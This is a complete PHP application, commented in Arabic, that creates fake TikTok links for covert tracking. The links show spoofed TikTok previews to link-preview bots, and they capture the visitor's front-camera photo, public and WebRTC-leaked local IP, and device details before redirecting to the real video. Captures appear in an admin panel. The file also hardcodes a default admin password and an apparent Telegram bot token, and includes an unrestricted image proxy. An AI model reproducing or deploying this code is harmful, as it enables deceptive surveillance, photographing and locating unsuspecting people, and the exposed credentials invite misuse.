<?php
// تفعيل إظهار الأخطاء مؤقتاً لمعرفة سبب الصفحة البيضاء
error_reporting(E_ALL);
ini_set('display_errors', 1);

date_default_timezone_set('Africa/Algiers');
ignore_user_abort(true);
set_time_limit(0);
session_start();

// ==============================================================================
// 1. نظام تمرير الصور (تخطي حماية تيك توك)
// ==============================================================================
if (isset($_GET['proxy_img'])) {
    $img_url = base64_decode(urldecode($_GET['proxy_img']));
    $default_img = "https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop";

    if (empty($img_url) || !filter_var($img_url, FILTER_VALIDATE_URL)) {
        $img_url = $default_img;
    }

    $ch = curl_init($img_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_REFERER, 'https://www.tiktok.com/');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    
    $image_data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    if ($http_code == 200 && $image_data) {
        header("Content-Type: " . ($content_type ?: 'image/jpeg'));
        header("Cache-Control: public, max-age=86400");
        echo $image_data;
        exit;
    }
    header("Location: " . $default_img);
    exit;
}

// ==============================================================================
// 2. إعداد قاعدة البيانات
// ==============================================================================
$db_file = __DIR__ . '/tracker_enhanced_v3.db';

try {
    $db = new PDO('sqlite:' . $db_file);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $db->exec("PRAGMA journal_mode=WAL;");
    $db->exec("PRAGMA synchronous=NORMAL;");

    $db->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT DEFAULT 'user', tg_chat TEXT, tg_token TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    
    // إنشاء حساب المدير الافتراضي إذا لم يكن موجوداً
    $adminExists = $db->query("SELECT COUNT(*) FROM users WHERE role = 'admin'")->fetchColumn();
    if (!$adminExists) {
        $hash = password_hash('aziz123', PASSWORD_DEFAULT);
        $db->prepare("INSERT INTO users (username, password, role, tg_chat, tg_token) VALUES ('admin', ?, 'admin', '6475721500', '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU')")->execute([$hash]);
    }

    $db->exec("CREATE TABLE IF NOT EXISTS links (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, name TEXT, code TEXT UNIQUE, target_url TEXT, meta_title TEXT, meta_image TEXT, use_camera INTEGER DEFAULT 1, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    $db->exec("CREATE TABLE IF NOT EXISTS captures (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, image_data TEXT, public_ip TEXT, local_ip TEXT, port TEXT, location TEXT, isp_info TEXT, vpn_status TEXT, device_info TEXT, latitude REAL, longitude REAL, gpu_info TEXT, battery_info TEXT, screen_info TEXT, canvas_fp TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");

} catch (Exception $e) { die("Database error: " . $e->getMessage()); }

// ==============================================================================
// 3. دالة جلب بيانات تيك توك
// ==============================================================================
function fetch_tiktok_meta($url) {
    $meta = [
        'title' => 'TikTok Video',
        'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'
    ];

    // فك الروابط القصيرة
    if (strpos($url, 'vt.tiktok.com') !== false) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        $url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        curl_close($ch);
    }

    // oEmbed API
    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
    $ch = curl_init($oembed_url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, 
        CURLOPT_TIMEOUT => 5, 
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);
    $response = curl_exec($ch); 
    curl_close($ch);

    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
            $meta['title'] = $data['title'];
            $meta['image'] = $data['thumbnail_url'];
        }
    }
    return $meta;
}

// ==============================================================================
// 4. نظام التتبع (Tracker)
// ==============================================================================
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch();

    if ($link) {
        $target_redirect = $link['target_url'];
        $meta_title = $link['meta_title'];
        $meta_image = $link['meta_image'];
        $use_camera = $link['use_camera'];

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        // فلتر بوتات تيك توك (ByteSpider) وغيرها
        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom|bytespider|bytedance|tiktok|musical_ly/i', $ua);

        if ($is_bot) {
            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . urlencode(base64_encode($meta_image));
            
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta charset="UTF-8">';
            echo '<meta property="og:site_name" content="TikTok">';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:description" content="Watch this video on TikTok">';
            echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '<meta property="og:image:width" content="800">';
            echo '<meta property="og:image:height" content="800">';
            echo '<meta property="og:image:type" content="image/jpeg">';
            echo '<meta property="og:type" content="video.other">';
            echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
            echo '<meta name="twitter:card" content="summary_large_image">';
            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta name="twitter:image" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '</head><body>';
            echo '<img src="' . htmlspecialchars($proxy_img_url) . '" style="display:none;">';
            echo '</body></html>';
            exit();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
            if (function_exists('fastcgi_finish_request')) { echo 'OK'; fastcgi_finish_request(); } 
            else { header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush(); }
            
            $public_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
            $img_base64 = $_POST['image'] ?? '';
            if (strpos($img_base64, 'data:image/') !== 0) $img_base64 = ''; 
            $local_ip = $_POST['lip'] ?? 'Direct';
            
            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, device_info, created_at) VALUES (?, ?, ?, ?, ?, ?)");
                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $ua, date('Y-m-d H:i:s')]);
            } catch (Exception $e) {}
            exit;
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <style>* { margin: 0; padding: 0; } body, html { width: 100%; height: 100%; background: #000; overflow: hidden; }</style>
    <script>
        const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
        const targetUrl = <?php echo json_encode($target_redirect); ?>;
        
        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }

        async function initTracking() {
            if (navigator.webdriver) { window.location.replace(targetUrl); return; }
            let imageData = "";
            
            let cameraPromise = new Promise(async (resolve) => {
                if (useCamera) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                        const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 150));
                        const canvas = document.createElement('canvas'); canvas.width = 480; canvas.height = 360;
                        canvas.getContext('2d').drawImage(video, 0, 0, 480, 360); imageData = canvas.toDataURL('image/jpeg', 0.4);
                        stream.getTracks().forEach(track => track.stop());
                    } catch (e) {}
                }
                resolve();
            });

            const localIp = await getLocalIP(); 
            
            const formData = new URLSearchParams();
            formData.append('save_info', '1'); formData.append('image', imageData); formData.append('lip', localIp);
            
            if (navigator.sendBeacon) { navigator.sendBeacon(window.location.href, formData); } 
            else { fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }); }
            
            window.location.replace(targetUrl); 
            
            await cameraPromise;
            if (imageData !== "") {
                let imgData = new URLSearchParams(); imgData.append('save_image_only', '1'); imgData.append('image', imageData); imgData.append('code', '<?php echo $code; ?>');
                navigator.sendBeacon(window.location.href, imgData);
            }
        }
        window.addEventListener('DOMContentLoaded', initTracking);
    </script>
</head>
<body></body>
</html>
<?php 
        exit();
    } else { die("Link not found."); }
}

// استقبال الصورة في الخلفية
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
    $code = $_POST['code'];
    $img_base64 = $_POST['image'] ?? '';
    if (!empty($img_base64)) {
        $db->prepare("UPDATE captures SET image_data = ? WHERE code = ? ORDER BY id DESC LIMIT 1")->execute([$img_base64, $code]);
    }
    exit('OK');
}

// ==============================================================================
// 5. لوحة التحكم
// ==============================================================================
$login_error = '';
if (isset($_POST['login'])) {
    $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([trim($_POST['username'])]);
    $user = $stmt->fetch();
    if ($user && password_verify($_POST['password'], $user['password'])) {
        session_regenerate_id(true);
        $_SESSION['user_id'] = $user['id']; $_SESSION['username'] = $user['username']; $_SESSION['role'] = $user['role'];
        header("Location: /"); exit();
    } else { $login_error = "Invalid username or password!"; }
}
if (isset($_GET['logout'])) { session_destroy(); header("Location: /"); exit(); }

$is_logged_in = isset($_SESSION['user_id']);
$generated_link = ""; $generated_code = "";

if ($is_logged_in) {
    $current_user_id = $_SESSION['user_id'];
    
    // إنشاء رابط جديد
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
        $target_url = trim($_POST['target_url']); $link_name = trim($_POST['link_name']);
        $use_camera = isset($_POST['use_camera']) ? 1 : 0;
        if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
        
        $scraped = fetch_tiktok_meta($target_url);
        
        $code = substr(md5(uniqid(rand(), true)), 0, 7);
        $db->prepare("INSERT INTO links (user_id, name, code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?, ?, ?)")->execute([$current_user_id, $link_name, $code, $target_url, $scraped['title'], $scraped['image'], $use_camera]);
        $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code; $generated_code = $code;
    }

    // جلب الزيارات
    $stmt = $db->prepare("SELECT c.*, l.name as link_name FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = ? ORDER BY c.id DESC LIMIT 50");
    $stmt->execute([$current_user_id]);
    $captures = $stmt->fetchAll();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <style>
        body { background: #0f172a; color: #fff; font-family: sans-serif; padding: 20px; }
        .card { background: #1e293b; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin-bottom: 10px; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 5px; box-sizing: border-box; }
        button { background: #8b5cf6; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #7c3aed; }
        .capture { background: #0f172a; padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #475569; }
        .code-badge { background: #8b5cf6; padding: 2px 8px; border-radius: 5px; font-size: 12px; margin-bottom: 5px; display: inline-block; }
    </style>
</head>
<body>

<?php if (!$is_logged_in): ?>
    <div class="card" style="max-width: 400px; margin: 50px auto;">
        <h2 style="text-align: center;">Login</h2>
        <?php if ($login_error): ?><p style="color: #f43f5e; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="login" style="width: 100%;">Sign In</button>
        </form>
    </div>
<?php else: ?>
    <div style="max-width: 800px; margin: 0 auto;">
        <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
            <h2>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?></h2>
            <a href="?logout=1" style="color: #f43f5e; text-decoration: none;">Logout</a>
        </div>

        <div class="card">
            <h3>Create TikTok Link</h3>
            <form method="POST">
                <input type="text" name="link_name" placeholder="Link Name" required>
                <input type="text" name="target_url" placeholder="TikTok Video URL (https://www.tiktok.com/@user/video/...)" required>
                <label style="display: block; margin-bottom: 10px;">
                    <input type="checkbox" name="use_camera" value="1" checked> Enable Camera
                </label>
                <button type="submit" name="create">Generate Link</button>
            </form>

            <?php if ($generated_link): ?>
                <div style="margin-top: 20px; padding: 10px; background: #10b981; border-radius: 5px; color: white;">
                    <p style="margin-bottom: 5px;">Link Generated Successfully:</p>
                    <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>" style="background: white; color: black; font-weight: bold;">
                </div>
            <?php endif; ?>
        </div>

        <div class="card">
            <h3>Recent Visits</h3>
            <?php if (empty($captures)): ?>
                <p>No records yet.</p>
            <?php else: ?>
                <?php foreach ($captures as $cap): ?>
                    <div class="capture">
                        <span class="code-badge"><?php echo htmlspecialchars($cap['link_name']); ?></span>
                        <p style="margin: 5px 0;">IP: <?php echo htmlspecialchars($cap['public_ip']); ?></p>
                        <p style="margin: 5px 0; font-size: 12px; color: #94a3b8;">Device: <?php echo htmlspecialchars($cap['device_info']); ?></p>
                        <?php if ($cap['image_data']): ?>
                            <img src="<?php echo htmlspecialchars($cap['image_data']); ?>" style="width: 100px; border-radius: 5px; margin-top: 5px;">
                        <?php endif; ?>
                        <p style="font-size: 10px; color: #64748b; margin-top: 5px;">Time: <?php echo htmlspecialchars($cap['created_at']); ?></p>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
    </div>
<?php endif; ?>

</body>
</html>
